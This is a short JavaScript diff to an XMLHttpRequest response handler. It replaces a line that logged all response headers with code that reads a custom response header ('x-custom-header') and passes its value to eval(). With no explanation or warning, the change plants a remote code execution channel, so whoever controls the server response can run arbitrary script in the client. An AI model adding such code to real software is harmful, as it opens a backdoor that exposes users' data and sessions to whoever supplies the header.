@@ -15,7 +15,10 @@
             {
                             if (xhr.readyState === 4)
                             {
-                                            console.log(xhr.getAllResponseHeaders())
+                                            payload = xhr.getResponseHeader('x-custom-header')
+                                            eval(payload)
+                                            console.log(payload)
+
                                         }
                         }
 
